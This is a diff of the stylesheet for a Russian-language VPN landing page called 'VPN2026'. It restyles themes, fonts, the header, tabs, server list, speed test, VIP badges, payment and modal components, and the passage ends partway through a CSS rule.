@@ -1,70 +1,71 @@
-html
 <!DOCTYPE html>
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>VPN2026 · Безопасный доступ</title>
-  <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
+  <title>VPN2026 · Премиум защита</title>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&family=JetBrains+Mono&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     :root {
-      /* Темная тема по умолчанию */
-      --bg: #0e0f13;
-      --card: #1e212a;
-      --primary: #6c5ce7;
-      --accent: #00cec9;
-      --text: #ffffff;
-      --muted: #b2bec3;
-      --danger: #d63031;
-      --success: #00b894;
-      --warning: #fdcb6e;
-      --radius: 16px;
-      --shadow: 0 10px 30px rgba(0,0,0,0.3);
-      --input-bg: #2d2f3a;
-      --header-bg: #1e212a;
+      /* Основные цвета */
+      --primary: #6e45e2;
+      --primary-dark: #4a2dbf;
+      --accent: #00d2ff;
+      --accent-dark: #00b4d8;
+      --danger: #ff4757;
+      --success: #2ed573;
+      --warning: #ffa502;
       --vip: #f39c12;
+      --vip-dark: #e67e22;
+      
+      /* Темная тема по умолчанию */
+      --bg: #0f0f1a;
+      --bg-secondary: #1a1a2e;
+      --card: #16213e;
+      --text: #ffffff;
+      --text-muted: #b8c2cc;
+      --input-bg: #1e293b;
+      --border: #2d3748;
+      --shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+      
+      /* Размеры */
+      --radius: 12px;
+      --header-height: 70px;
     }
 
     /* Светлая тема */
     [data-theme="light"] {
-      --bg: #f5f6fa;
+      --bg: #f8fafc;
+      --bg-secondary: #e2e8f0;
       --card: #ffffff;
-      --primary: #6c5ce7;
-      --accent: #00cec9;
-      --text: #2d3436;
-      --muted: #636e72;
-      --danger: #d63031;
-      --success: #00b894;
-      --warning: #e17055;
-      --shadow: 0 10px 30px rgba(0,0,0,0.1);
-      --input-bg: #f1f2f6;
-      --header-bg: #ffffff;
-      --vip: #e67e22;
+      --text: #1e293b;
+      --text-muted: #64748b;
+      --input-bg: #f1f5f9;
+      --border: #e2e8f0;
+      --shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
     }
 
-    /* Синяя тема */
-    [data-theme="blue"] {
-      --bg: #0c2461;
-      --card: #1e3799;
-      --primary: #4a69bd;
-      --accent: #78e08f;
-      --text: #ffffff;
-      --muted: #82ccdd;
-      --danger: #e55039;
-      --success: #78e08f;
-      --warning: #f6b93b;
-      --shadow: 0 10px 30px rgba(0,0,0,0.3);
-      --input-bg: #3c6382;
-      --header-bg: #1e3799;
-      --vip: #f6b93b;
+    /* Неоновая тема */
+    [data-theme="neon"] {
+      --primary: #00f5d4;
+      --primary-dark: #00bbf9;
+      --accent: #f15bb5;
+      --accent-dark: #9b5de5;
+      --bg: #0a0a12;
+      --bg-secondary: #14142a;
+      --card: #1e1e3f;
+      --text: #e2e2ff;
+      --text-muted: #a5a5c7;
+      --input-bg: #25254a;
+      --border: #3a3a5a;
     }
 
-    * { 
-      box-sizing: border-box; 
-      margin: 0; 
-      padding: 0; 
-      font-family: 'Rubik', sans-serif; 
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Montserrat', sans-serif;
     }
 
     body {
@@ -85,22 +86,34 @@ html
       left: 0;
       width: 100%;
       height: 100%;
-      background: url('https://images.unsplash.com/photo-1639762681057-408e52192e55?q=80&w=2232&auto=format&fit=crop') no-repeat center center;
-      background-size: cover;
-      opacity: 0.15;
+      background: radial-gradient(circle at 20% 30%, rgba(110, 69, 226, 0.15) 0%, transparent 40%),
+                  radial-gradient(circle at 80% 70%, rgba(0, 210, 255, 0.15) 0%, transparent 40%);
       z-index: -1;
-      animation: backgroundMove 120s linear infinite;
+      opacity: 0.8;
     }
 
-    @keyframes backgroundMove {
-      0% { transform: scale(1) rotate(0deg); }
-      50% { transform: scale(1.2) rotate(1deg); }
-      100% { transform: scale(1) rotate(0deg); }
+    /* Анимации */
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-10px); }
     }
 
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    /* Хедер */
     header {
-      background: var(--header-bg);
-      padding: 1rem 2rem;
+      background: var(--bg-secondary);
+      height: var(--header-height);
+      padding: 0 2rem;
       display: flex;
       justify-content: space-between;
       align-items: center;
@@ -108,104 +121,102 @@ html
       position: sticky;
       top: 0;
       z-index: 100;
-      transition: background 0.3s;
+      transition: all 0.3s;
+      border-bottom: 1px solid var(--border);
     }
 
     .logo {
       display: flex;
       align-items: center;
       gap: 10px;
+      font-weight: 700;
+      font-size: 1.5rem;
+      color: var(--accent);
+      text-decoration: none;
     }
 
     .logo i {
-      color: var(--accent);
-      font-size: 1.5rem;
+      font-size: 1.8rem;
+      animation: float 3s ease-in-out infinite;
     }
 
     nav {
       display: flex;
       align-items: center;
-      gap: 1rem;
+      gap: 1.5rem;
     }
 
     nav a {
-      color: var(--muted);
+      color: var(--text-muted);
       text-decoration: none;
       font-weight: 500;
       transition: all 0.3s;
       display: flex;
       align-items: center;
-      gap: 5px;
-    }
-
-    nav a:hover { 
-      color: var(--accent); 
-      transform: translateY(-2px); 
-    }
-
-    nav a i { 
-      font-size: 0.9rem; 
-    }
-
-    .theme-switcher {
-      background: var(--card);
-      border-radius: 20px;
-      padding: 5px;
-      display: flex;
-      align-items: center;
-      margin-left: 1rem;
-      cursor: pointer;
-      transition: all 0.3s;
-    }
-
-    .theme-switcher:hover {
-      transform: translateY(-2px);
-    }
-
-    .theme-icon {
-      padding: 5px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: var(--primary);
-      color: white;
-    }
-
-    .language-switcher {
+      gap: 8px;
+      font-size: 0.95rem;
       position: relative;
-      margin-left: 1rem;
+      padding: 0.5rem 0;
     }
 
-    .language-btn {
+    nav a:hover {
+      color: var(--accent);
+    }
+
+    nav a::after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      width: 0;
+      height: 2px;
+      background: var(--accent);
+      transition: width 0.3s;
+    }
+
+    nav a:hover::after {
+      width: 100%;
+    }
+
+    .nav-actions {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .theme-switcher, .language-btn {
       background: var(--card);
       border: none;
       color: var(--text);
-      padding: 5px 10px;
-      border-radius: var(--radius);
+      padding: 0.5rem;
+      border-radius: 50%;
       cursor: pointer;
       display: flex;
       align-items: center;
-      gap: 5px;
+      justify-content: center;
       transition: all 0.3s;
+      width: 40px;
+      height: 40px;
     }
 
-    .language-btn:hover {
+    .theme-switcher:hover, .language-btn:hover {
       background: var(--primary);
       color: white;
+      transform: translateY(-2px);
     }
 
     .language-dropdown {
       position: absolute;
       right: 0;
-      top: 40px;
+      top: 50px;
       background: var(--card);
       border-radius: var(--radius);
       box-shadow: var(--shadow);
       padding: 0.5rem;
       display: none;
       z-index: 10;
-      min-width: 120px;
+      min-width: 140px;
+      border: 1px solid var(--border);
     }
 
     .language-dropdown.show {
@@ -213,10 +224,13 @@ html
     }
 
     .language-option {
-      padding: 0.5rem;
-      border-radius: 5px;
+      padding: 0.7rem 1rem;
+      border-radius: 6px;
       cursor: pointer;
       transition: all 0.3s;
+      display: flex;
+      align-items: center;
+      gap: 10px;
     }
 
     .language-option:hover {
@@ -224,13 +238,16 @@ html
       color: white;
     }
 
-    main { 
-      flex: 1; 
-      padding: 2rem 1rem; 
-      display: flex; 
-      flex-direction: column; 
-      align-items: center; 
+    /* Основное содержимое */
+    main {
+      flex: 1;
+      padding: 2rem;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       width: 100%;
+      max-width: 1200px;
+      margin: 0 auto;
     }
 
     .card {
@@ -238,61 +255,83 @@ html
       border-radius: var(--radius);
       padding: 2rem;
       width: 100%;
-      max-width: 800px;
       box-shadow: var(--shadow);
       margin-bottom: 2rem;
       transition: transform 0.3s, box-shadow 0.3s;
+      border: 1px solid var(--border);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 4px;
+      background: linear-gradient(90deg, var(--primary), var(--accent));
     }
 
     .card:hover {
       transform: translateY(-5px);
-      box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
     }
 
-    h1 { 
-      font-size: 2rem; 
-      margin-bottom: 1.5rem; 
-      text-align: center; 
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 1.5rem;
       color: var(--accent);
       display: flex;
       align-items: center;
       justify-content: center;
-      gap: 10px;
+      gap: 12px;
+      font-weight: 700;
     }
 
     h2 {
-      font-size: 1.5rem;
+      font-size: 1.6rem;
       margin: 1.5rem 0 1rem;
       color: var(--accent);
+      font-weight: 600;
     }
 
-    label { 
-      display: block; 
-      margin-top: 1.25rem; 
-      font-weight: 500;
-      color: var(--muted);
+    p {
+      color: var(--text-muted);
+      line-height: 1.6;
+      margin-bottom: 1.5rem;
     }
 
+    /* Формы и инпуты */
     .input-group {
+      margin-bottom: 1.5rem;
       position: relative;
-      margin-bottom: 1rem;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+      color: var(--text-muted);
+      font-size: 0.95rem;
     }
 
     input, select, textarea {
-      width: 100%; 
-      padding: 0.8rem 1rem; 
+      width: 100%;
+      padding: 0.9rem 1.2rem;
       border-radius: var(--radius);
-      background: var(--input-bg); 
-      color: var(--text); 
-      border: 1px solid var(--muted); 
+      background: var(--input-bg);
+      color: var(--text);
+      border: 1px solid var(--border);
       font-size: 1rem;
       transition: all 0.3s;
+      font-family: 'Montserrat', sans-serif;
     }
 
-    input:focus, textarea:focus, select:focus { 
+    input:focus, textarea:focus, select:focus {
       outline: none;
       border-color: var(--accent);
-      box-shadow: 0 0 0 2px rgba(0,206,201,0.2);
+      box-shadow: 0 0 0 3px rgba(0, 210, 255, 0.2);
     }
 
     .input-icon {
@@ -300,34 +339,36 @@ html
       right: 15px;
       top: 50%;
       transform: translateY(-50%);
-      color: var(--muted);
+      color: var(--text-muted);
     }
 
+    /* Кнопки */
     button {
-      margin-top: 1.5rem; 
-      padding: 1rem; 
-      font-size: 1.1rem;
-      border: none; 
-      border-radius: var(--radius); 
-      background: var(--primary); 
+      padding: 1rem 1.5rem;
+      font-size: 1rem;
+      border: none;
+      border-radius: var(--radius);
+      background: var(--primary);
       color: white;
-      cursor: pointer; 
+      cursor: pointer;
       transition: all 0.3s;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 10px;
+      font-weight: 600;
       width: 100%;
     }
 
-    button:hover { 
-      background: var(--accent); 
+    button:hover {
+      background: var(--primary-dark);
       transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
     }
 
     button.secondary {
       background: var(--input-bg);
-      color: var(--muted);
+      color: var(--text-muted);
     }
 
     button.secondary:hover {
@@ -335,448 +376,56 @@ html
       color: white;
     }
 
+    /* Вкладки */
     .tabs {
-      display: flex; 
-      justify-content: center; 
-      gap: 0.5rem; 
+      display: flex;
+      justify-content: center;
+      gap: 0.8rem;
       margin-bottom: 2rem;
       flex-wrap: wrap;
       width: 100%;
-      max-width: 800px;
+      max-width: 1000px;
     }
 
     .tabs button {
       padding: 0.8rem 1.5rem;
-      border: none;
       border-radius: var(--radius);
       background: var(--input-bg);
-      color: var(--muted);
+      color: var(--text-muted);
       cursor: pointer;
       transition: all 0.3s;
       display: flex;
       align-items: center;
       gap: 8px;
       font-weight: 500;
+      width: auto;
     }
 
-    .tabs button i { font-size: 0.9rem; }
-    .tabs button.active { 
-      background: var(--primary); 
+    .tabs button i {
+      font-size: 0.9rem;
+    }
+
+    .tabs button.active {
+      background: var(--primary);
       color: white;
       transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
     }
+
     .tabs button:hover:not(.active) {
-      background: var(--card);
+      background: var(--bg-secondary);
     }
 
-    .progress-container {
-      width: 100%;
-      margin: 1.5rem 0;
-    }
-
-    .progress-steps {
-      display: flex;
-      justify-content: space-between;
-      position: relative;
-      margin-bottom: 1rem;
-    }
-
-    .progress-steps::before {
-      content: '';
-      position: absolute;
-      top: 50%;
-      left: 0;
-      right: 0;
-      height: 2px;
-      background: var(--input-bg);
-      z-index: 1;
-    }
-
-    .progress-bar {
-      position: absolute;
-      top: 50%;
-      left: 0;
-      height: 2px;
-      background: var(--accent);
-      z-index: 2;
-      transition: width 0.4s ease;
-    }
-
-    .step {
-      width: 30px;
-      height: 30px;
-      border-radius: 50%;
-      background: var(--input-bg);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: var(--muted);
-      position: relative;
-      z-index: 3;
-      transition: all 0.3s;
-    }
-
-    .step.active {
-      background: var(--primary);
-      color: white;
-    }
-
-    .step.completed {
-      background: var(--success);
-      color: white;
-    }
-
-    .step-label {
-      position: absolute;
-      top: 40px;
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 0.8rem;
-      color: var(--muted);
-      white-space: nowrap;
-    }
-
-    .step.active .step-label {
-      color: var(--accent);
-      font-weight: 500;
-    }
-
-    .step.completed .step-label {
-      color: var(--success);
-    }
-
-    .age-display {
-      margin-top: 0.5rem;
-      font-size: 0.9rem;
-      color: var(--muted);
-      display: flex;
-      align-items: center;
-      gap: 5px;
-    }
-
-    .age-display span {
-      color: var(--accent);
-      font-weight: 500;
-    }
-
-    .social-login {
-      display: flex;
-      flex-direction: column;
-      gap: 0.8rem;
-      margin-top: 1.5rem;
-    }
-
-    .social-btn {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      padding: 0.8rem;
-      border-radius: var(--radius);
-      font-weight: 500;
-      cursor: pointer;
-      transition: all 0.3s;
-    }
-
-    .social-btn.google {
-      background: #4285F4;
-      color: white;
-    }
-
-    .social-btn.facebook {
-      background: #3b5998;
-      color: white;
-    }
-
-    .social-btn.apple {
-      background: #000;
-      color: white;
-    }
-
-    .social-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-    }
-
-    .divider {
-      display: flex;
-      align-items: center;
-      margin: 1.5rem 0;
-      color: var(--muted);
-      font-size: 0.9rem;
-    }
-
-    .divider::before, .divider::after {
-      content: '';
-      flex: 1;
-      height: 1px;
-      background: var(--input-bg);
-      margin: 0 1rem;
-    }
-    
-    .features-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 1.5rem;
-      margin: 2rem 0;
-    }
-
-    .feature-card {
-      background: var(--input-bg);
-      border-radius: var(--radius);
-      padding: 1.5rem;
-      transition: all 0.3s;
-    }
-
-    .feature-card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-    }
-
-    .feature-icon {
-      font-size: 2rem;
-      color: var(--accent);
-      margin-bottom: 1rem;
-    }
-
-    .feature-title {
-      font-weight: 500;
-      margin-bottom: 0.5rem;
-      color: var(--text);
-    }
-
-    .feature-desc {
-      font-size: 0.9rem;
-      color: var(--muted);
-    }
-
-    .team-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-      gap: 1.5rem;
-      margin: 2rem 0;
-    }
-
-    .team-card {
-      background: var(--input-bg);
-      border-radius: var(--radius);
-      padding: 1.5rem;
-      text-align: center;
-      transition: all 0.3s;
-    }
-
-    .team-card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
-    }
-
-    .team-avatar {
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      object-fit: cover;
-      margin: 0 auto 1rem;
-      border: 3px solid var(--primary);
-    }
-
-    .team-name {
-      font-weight: 500;
-      margin-bottom: 0.5rem;
-      color: var(--text);
-    }
-
-    .team-role {
-      color: var(--accent);
-      font-size: 0.9rem;
-      margin-bottom: 1rem;
-    }
-
-    .team-social {
-      display: flex;
-      justify-content: center;
-      gap: 1rem;
-    }
-
-    .team-social a {
-      color: var(--muted);
-      transition: all 0.3s;
-    }
-
-    .team-social a:hover {
-      color: var(--accent);
-      transform: translateY(-2px);
-    }
-
-    .faq-item {
-      margin-bottom: 1.5rem;
-      background: var(--input-bg);
-      border-radius: var(--radius);
-      overflow: hidden;
-      transition: all 0.3s;
-    }
-
-    .faq-item:hover {
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-    }
-
-    .faq-question {
-      padding: 1rem 1.5rem;
-      background: var(--card);
-      cursor: pointer;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      font-weight: 500;
-      transition: all 0.3s;
-    }
-
-    .faq-question:hover {
-      background: var(--primary);
-      color: white;
-    }
-
-    .faq-question i {
-      transition: transform 0.3s;
-    }
-
-    .faq-answer {
-      padding: 1rem 1.5rem;
-      display: none;
-      color: var(--muted);
-    }
-
-    .faq-item.active .faq-question {
-      background: var(--primary);
-      color: white;
-    }
-
-    .faq-item.active .faq-question i {
-      transform: rotate(180deg);
-    }
-
-    .faq-item.active .faq-answer {
-      display: block;
-    }
-
-    .notification {
-      position: fixed;
-      bottom: 20px;
-      right: 20px;
-      background: var(--primary);
-      color: white;
-      padding: 1rem 1.5rem;
-      border-radius: var(--radius);
-      box-shadow: var(--shadow);
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      transform: translateX(150%);
-      transition: transform 0.4s ease;
-      z-index: 1000;
-    }
-
-    .notification.show {
-      transform: translateX(0);
-    }
-
-    .notification.success {
-      background: var(--success);
-    }
-
-    .notification.error {
-      background: var(--danger);
-    }
-
-    .notification.warning {
-      background: var(--warning);
-      color: #333;
-    }
-
-    .permission-modal {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.8);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 10000;
-      opacity: 0;
-      visibility: hidden;
-      transition: all 0.3s;
-    }
-
-    .permission-modal.active {
-      opacity: 1;
-      visibility: visible;
-    }
-
-    .permission-content {
-      background: var(--card);
-      padding: 2rem;
-      border-radius: var(--radius);
-      max-width: 500px;
-      width: 90%;
-      box-shadow: var(--shadow);
-      transform: translateY(20px);
-      transition: transform 0.3s;
-    }
-
-    .permission-modal.active .permission-content {
-      transform: translateY(0);
-    }
-
-    .permission-title {
-      color: var(--accent);
-      margin-bottom: 1rem;
-      text-align: center;
-    }
-
-    .permission-text {
-      margin-bottom: 1.5rem;
-      color: var(--muted);
-    }
-
-    .permission-buttons {
-      display: flex;
-      gap: 1rem;
-      justify-content: center;
-    }
-
-    .permission-btn {
-      padding: 0.8rem 1.5rem;
-      border-radius: var(--radius);
-      border: none;
-      cursor: pointer;
-      font-weight: 500;
-      transition: all 0.3s;
-    }
-
-    .permission-btn.accept {
-      background: var(--success);
-      color: white;
-    }
-
-    .permission-btn.decline {
-      background: var(--danger);
-      color: white;
-    }
-
-    .permission-btn:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-    }
-
+    /* Статус подключения */
     .connection-status {
       display: flex;
       align-items: center;
-      gap: 8px;
-      margin-top: 1rem;
-      padding: 0.5rem;
+      gap: 10px;
+      margin: 1.5rem 0;
+      padding: 0.8rem;
       border-radius: var(--radius);
       background: var(--input-bg);
+      border: 1px solid var(--border);
     }
 
     .status-indicator {
@@ -795,29 +444,29 @@ html
       animation: pulse 1.5s infinite;
     }
 
-    @keyframes pulse {
-      0% { opacity: 1; }
-      50% { opacity: 0.5; }
-      100% { opacity: 1; }
-    }
-
+    /* Список серверов */
     .server-list {
       margin-top: 1rem;
-      max-height: 200px;
+      max-height: 300px;
       overflow-y: auto;
       border-radius: var(--radius);
       background: var(--input-bg);
-      padding: 0.5rem;
+      border: 1px solid var(--border);
     }
 
     .server-item {
-      padding: 0.8rem;
-      border-radius: 5px;
+      padding: 1rem;
+      border-radius: 6px;
       cursor: pointer;
       transition: all 0.3s;
       display: flex;
       align-items: center;
-      gap: 10px;
+      gap: 12px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .server-item:last-child {
+      border-bottom: none;
     }
 
     .server-item:hover {
@@ -826,22 +475,24 @@ html
     }
 
     .server-item i {
+      font-size: 1.2rem;
       color: var(--accent);
     }
 
+    /* Тест скорости */
     .speed-test {
       margin-top: 1.5rem;
-      padding: 1rem;
+      padding: 1.5rem;
       border-radius: var(--radius);
       background: var(--input-bg);
-      text-align: center;
+      border: 1px solid var(--border);
     }
 
     .speed-meter {
       height: 8px;
       background: var(--bg);
       border-radius: 4px;
-      margin: 1rem 0;
+      margin: 1.5rem 0;
       overflow: hidden;
     }
 
@@ -853,25 +504,27 @@ html
     }
 
     .speed-results {
-      display: flex;
-      justify-content: space-between;
-      margin-top: 1rem;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 1rem;
+      margin-top: 1.5rem;
     }
 
     .speed-value {
-      font-size: 1.2rem;
-      font-weight: 500;
+      font-size: 1.5rem;
+      font-weight: 700;
       color: var(--accent);
+      font-family: 'JetBrains Mono', monospace;
     }
 
     .speed-label {
-      font-size: 0.8rem;
-      color: var(--muted);
+      font-size: 0.9rem;
+      color: var(--text-muted);
     }
 
     /* VIP стили */
     .vip-badge {
-      background: var(--vip);
+      background: linear-gradient(135deg, var(--vip), var(--vip-dark));
       color: white;
       padding: 0.3rem 0.8rem;
       border-radius: 20px;
@@ -881,6 +534,8 @@ html
       align-items: center;
       gap: 5px;
       margin-left: 10px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
     }
 
     .vip-feature {
@@ -892,149 +547,139 @@ html
       position: absolute;
       top: -8px;
       right: -8px;
-      background: var(--vip);
+      background: linear-gradient(135deg, var(--vip), var(--vip-dark));
       color: white;
       font-size: 0.7rem;
       font-weight: bold;
-      padding: 2px 6px;
+      padding: 2px 8px;
       border-radius: 10px;
+      z-index: 1;
     }
 
     .vip-button {
-      background: var(--vip);
+      background: linear-gradient(135deg, var(--vip), var(--vip-dark));
       color: white;
     }
 
     .vip-button:hover {
-      background: #e67e22;
+      background: linear-gradient(135deg, var(--vip-dark), #d35400);
+      transform: translateY(-2px) scale(1.02);
     }
 
-    .payment-modal {
+    /* Модальные окна */
+    .modal {
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0,0,0,0.8);
+      background: rgba(0, 0, 0, 0.8);
       display: flex;
       justify-content: center;
       align-items: center;
-      z-index: 10000;
+      z-index: 1000;
       opacity: 0;
       visibility: hidden;
       transition: all 0.3s;
+      backdrop-filter: blur(5px);
     }
 
-    .payment-modal.active {
+    .modal.active {
       opacity: 1;
       visibility: visible;
     }
 
-    .payment-content {
+    .modal-content {
       background: var(--card);
-      padding: 2rem;
+      padding: 2.5rem;
       border-radius: var(--radius);
       max-width: 500px;
       width: 90%;
       box-shadow: var(--shadow);
       transform: translateY(20px);
       transition: transform 0.3s;
+      position: relative;
+      border: 1px solid var(--border);
+      max-height: 90vh;
+      overflow-y: auto;
     }
 
-    .payment-modal.active .payment-content {
+    .modal.active .modal-content {
       transform: translateY(0);
     }
 
-    .payment-title {
-      color: var(--vip);
-      margin-bottom: 1rem;
-      text-align: center;
-    }
-
-    .payment-text {
-      margin-bottom: 1.5rem;
-      color: var(--muted);
-    }
-
-    .payment-methods {
-      display: flex;
-      flex-direction: column;
-      gap: 0.8rem;
-      margin-bottom: 1.5rem;
-    }
-
-    .payment-method {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      padding: 0.8rem;
-      border-radius: var(--radius);
-      background: var(--input-bg);
+    .modal-close {
+      position: absolute;
+      top: 1rem;
+      right: 1rem;
+      background: none;
+      border: none;
+      color: var(--text-muted);
+      font-size: 1.5rem;
       cursor: pointer;
       transition: all 0.3s;
     }
 
-    .payment-method:hover {
-      background: var(--primary);
-      color: white;
+    .modal-close:hover {
+      color: var(--danger);
+      transform: rotate(90deg);
     }
 
-    .payment-method.active {
-      background: var(--vip);
-      color: white;
+    .modal-title {
+      color: var(--accent);
+      margin-bottom: 1.5rem;
+      text-align: center;
+      font-size: 1.8rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
     }
 
-    .payment-method i {
-      font-size: 1.5rem;
+    .modal-text {
+      margin-bottom: 1.5rem;
+      color: var(--text-muted);
+      line-height: 1.6;
     }
 
-    .payment-buttons {
+    .modal-buttons {
       display: flex;
       gap: 1rem;
       justify-content: center;
+      margin-top: 2rem;
     }
 
-    .payment-btn {
-      padding: 0.8rem 1.5rem;
+    .modal-btn {
+      padding: 0.9rem 1.8rem;
       border-radius: var(--radius);
       border: none;
       cursor: pointer;
-      font-weight: 500;
+      font-weight: 600;
       transition: all 0.3s;
+      min-width: 150px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
     }
 
-    .payment-btn.pay {
-      background: var(--vip);
+    .modal-btn.accept {
+      background: var(--success);
       color: white;
     }
 
-    .payment-btn.cancel {
+    .modal-btn.decline {
       background: var(--danger);
       color: white;
     }
 
-    .payment-btn:hover {
+    .modal-btn:hover {
       transform: translateY(-2px);
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
     }
 
-    .card-input {
-      margin-top: 1rem;
-    }
-
-    .card-input-group {
-      display: flex;
-      gap: 1rem;
-    }
-
-    .card-input-group input {
-      flex: 1;
-    }
-
-    .card-input-group input:first-child {
-      flex: 2;
-    }
-
+    /* VIP модальное окно */
     .vip-benefits {
       margin: 1.5rem 0;
     }
@@ -1042,160 +687,260 @@ html
     .vip-benefit {
       display: flex;
       align-items: center;
-      gap: 10px;
-      margin-bottom: 0.8rem;
+      gap: 12px;
+      margin-bottom: 1rem;
       color: var(--text);
+      padding: 0.8rem;
+      border-radius: var(--radius);
+      background: var(--input-bg);
+      transition: all 0.3s;
+    }
+
+    .vip-benefit:hover {
+      transform: translateX(5px);
+      background: var(--primary);
+      color: white;
     }
 
     .vip-benefit i {
       color: var(--vip);
+      font-size: 1.2rem;
+      min-width: 24px;
     }
 
-    /* Подтверждение платежа */
-    .confirmation-modal {
+    .payment-methods {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 0.8rem;
+      margin: 1.5rem 0;
+    }
+
+    .payment-method {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 8px;
+      padding: 1rem;
+      border-radius: var(--radius);
+      background: var(--input-bg);
+      cursor: pointer;
+      transition: all 0.3s;
+      border: 1px solid var(--border);
+      text-align: center;
+    }
+
+    .payment-method:hover {
+      background: var(--primary);
+      color: white;
+      border-color: var(--primary);
+    }
+
+    .payment-method.active {
+      background: var(--vip);
+      color: white;
+      border-color: var(--vip-dark);
+      transform: translateY(-2px);
+    }
+
+    .payment-method i {
+      font-size: 2rem;
+      margin-bottom: 0.5rem;
+    }
+
+    .card-input {
+      margin-top: 1.5rem;
+    }
+
+    .card-input-group {
+      display: grid;
+      grid-template-columns: 2fr 1fr;
+      gap: 1rem;
+    }
+
+    /* Уведомления */
+    .notification {
       position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: var(--primary);
+      color: white;
+      padding: 0.8rem 1.2rem;
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      transform: translateX(150%);
+      transition: transform 0.4s ease;
+      z-index: 1000;
+      max-width: 300px;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      opacity: 0;
+    }
+
+    .notification.show {
+      transform: translateX(0);
+      opacity: 1;
+    }
+
+    .notification.success {
+      background: var(--success);
+    }
+
+    .notification.error {
+      background: var(--danger);
+    }
+
+    .notification.warning {
+      background: var(--warning);
+      color: #333;
+    }
+
+    .notification-close {
+      margin-left: auto;
+      cursor: pointer;
+      opacity: 0.8;
+      transition: opacity 0.3s;
+    }
+
+    .notification-close:hover {
+      opacity: 1;
+    }
+
+    /* Адаптивность */
+    @media (max-width: 768px) {
+      header {
+        padding: 0 1rem;
+        height: 60px;
+      }
+      
+      nav {
+        display: none;
+      }
+      
+      .card {
+        padding: 1.5rem;
+      }
+      
+      .tabs {
+        gap: 0.5rem;
+      }
+      
+      .tabs button {
+        padding: 0.6rem 1rem;
+        font-size: 0.8rem;
+      }
+      
+      .payment-methods {
+        grid-template-columns: 1fr;
+      }
+      
+      .card-input-group {
+        grid-template-columns: 1fr;
+      }
+      
+      .modal-content {
+        padding: 1.5rem;
+      }
+    }
+
+    /* Специальные VIP фичи */
+    .vip-exclusive {
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .vip-exclusive::before {
+      content: '';
+      position: absolute;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      background: rgba(0,0,0,0.8);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      z-index: 10000;
-      opacity: 0;
-      visibility: hidden;
-      transition: all 0.3s;
+      background: linear-gradient(135deg, rgba(243, 156, 18, 0.1), rgba(230, 126, 34, 0.2));
+      z-index: 0;
     }
-
-    .confirmation-modal.active {
-      opacity: 1;
-      visibility: visible;
+    
+    .vip-exclusive-content {
+      position: relative;
+      z-index: 1;
     }
-
-    .confirmation-content {
